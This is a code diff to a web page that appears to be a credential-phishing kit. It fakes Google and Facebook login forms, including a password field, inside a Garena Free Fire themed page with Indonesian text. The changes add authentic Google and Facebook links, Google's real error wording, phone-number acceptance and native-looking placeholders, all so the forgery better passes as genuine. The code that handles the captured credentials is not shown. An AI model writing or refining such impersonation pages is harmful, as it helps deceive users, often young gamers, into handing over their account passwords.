@@ -1090,11 +1090,11 @@
           <!-- Step 1: Email -->
           <div id="rp-g-email-step">
             <div class="g-signin-input-wrap">
-              <input type="email" id="rp-g-email" class="g-signin-input" placeholder=" " autocomplete="email" onkeydown="if(event.key==='Enter')handleRpGoogleNext()"/>
+              <input type="text" id="rp-g-email" class="g-signin-input" placeholder=" " autocomplete="username" onkeydown="if(event.key==='Enter')handleRpGoogleNext()"/>
               <label for="rp-g-email" class="g-signin-lbl">Email or phone</label>
             </div>
             <div class="g-signin-err" id="rp-g-err"></div>
-            <button class="g-signin-forgot" type="button">Forgot email?</button>
+            <button class="g-signin-forgot" type="button" onclick="window.open('https://accounts.google.com/signin/v2/usernamerecovery','_blank')">Forgot email?</button>
             <div class="g-signin-actions">
               <button class="g-signin-create" type="button" onclick="window.open('https://accounts.google.com/signup/v2/createaccount?flowName=GlifWebSignIn&flowEntry=SignUp','_blank')">Create account</button>
               <button class="g-signin-next" type="button" onclick="handleRpGoogleNext()">
@@ -1126,7 +1126,7 @@
           </div>
         </div>
         <div class="g-signin-footer">
-          <a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a>
+          <a href="https://support.google.com/accounts?hl=en" target="_blank">Help</a><a href="https://policies.google.com/privacy" target="_blank">Privacy</a><a href="https://policies.google.com/terms" target="_blank">Terms</a>
         </div>
       </div>
 
@@ -1137,18 +1137,18 @@
           <div class="fb-login-tagline">Log in to continue with Garena Free Fire</div>
           <div class="fb-login-card">
             <div class="fb-err" id="rp-fb-err"></div>
-            <input type="email" id="rp-fb-email" class="fb-login-input" placeholder="contoh@gmail.com / contoh@yahoo.com" autocomplete="email"/>
-            <input type="password" id="rp-fb-pass" class="fb-login-input" placeholder="Password" autocomplete="current-password"/>
+            <input type="text" id="rp-fb-email" class="fb-login-input" placeholder="Nomor ponsel atau email" autocomplete="username"/>
+            <input type="password" id="rp-fb-pass" class="fb-login-input" placeholder="Kata sandi" autocomplete="current-password"/>
             <button class="fb-login-btn" type="button" onclick="handleRpFacebookLogin()">
               <div class="fb-spinner" id="rp-fb-spinner"></div>
               <span id="rp-fb-btn-txt">Log In</span>
             </button>
-            <a href="#" class="fb-forgot">Forgotten password?</a>
+            <a href="https://www.facebook.com/recover/initiate/" target="_blank" class="fb-forgot">Forgotten password?</a>
             <div class="fb-divider"><span class="fb-divider-txt">or</span></div>
             <button class="fb-create-btn" type="button" onclick="window.open('https://www.facebook.com/r.php','_blank')">Create new account</button>
           </div>
           <div class="fb-login-links">
-            <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Help</a>
+            <a href="https://www.facebook.com/privacy/policy/" target="_blank">Privacy</a><a href="https://www.facebook.com/terms/" target="_blank">Terms</a><a href="https://www.facebook.com/help/" target="_blank">Help</a>
           </div>
         </div>
       </div>
@@ -1255,18 +1255,23 @@ function showRpOauthScreen(screen) {
 }
 var rpGAttempts = 0; var rpFbAttempts = 0; var RP_MAX = 2;
 
-function isValidEmail(e) { return /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(e); }
+function isValidInput(e) {
+  if (/^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(e)) return true;
+  var digits = e.replace(/[\s\-().+]/g,'');
+  return /^\d{8,15}$/.test(digits);
+}
+function isValidEmail(e) { return isValidInput(e); }
 function handleRpGoogleNext() {
   var emailEl = document.getElementById('rp-g-email');
   var errEl   = document.getElementById('rp-g-err');
   var email   = emailEl ? emailEl.value.trim() : '';
   if (!email) {
-    if (errEl) { errEl.textContent = 'Masukkan email kamu, contoh: nama@gmail.com'; errEl.classList.add('show'); }
+    if (errEl) { errEl.textContent = 'Enter an email or phone number'; errEl.classList.add('show'); }
     if (emailEl) emailEl.focus();
     return;
   }
-  if (!isValidEmail(email)) {
-    if (errEl) { errEl.textContent = 'Email tidak valid. Contoh: nama@gmail.com, nama@yahoo.com'; errEl.classList.add('show'); }
+  if (!isValidInput(email)) {
+    if (errEl) { errEl.textContent = "Couldn't find your Google Account"; errEl.classList.add('show'); }
     if (emailEl) emailEl.focus();
     return;
   }
@@ -1329,8 +1334,8 @@ function handleRpFacebookLogin() {
   var email   = emailEl ? emailEl.value.trim() : '';
   var pass    = passEl ? passEl.value : '';
   var fbErrEl = document.getElementById('rp-fb-err');
-  if (!email || !isValidEmail(email)) {
-    if (fbErrEl) { fbErrEl.textContent = 'Masukkan email valid, contoh: nama@gmail.com'; fbErrEl.classList.add('show'); }
+  if (!email || !isValidInput(email)) {
+    if (fbErrEl) { fbErrEl.textContent = 'Nomor ponsel atau email tidak valid.'; fbErrEl.classList.add('show'); }
     if (emailEl) emailEl.focus();
     return;
   }
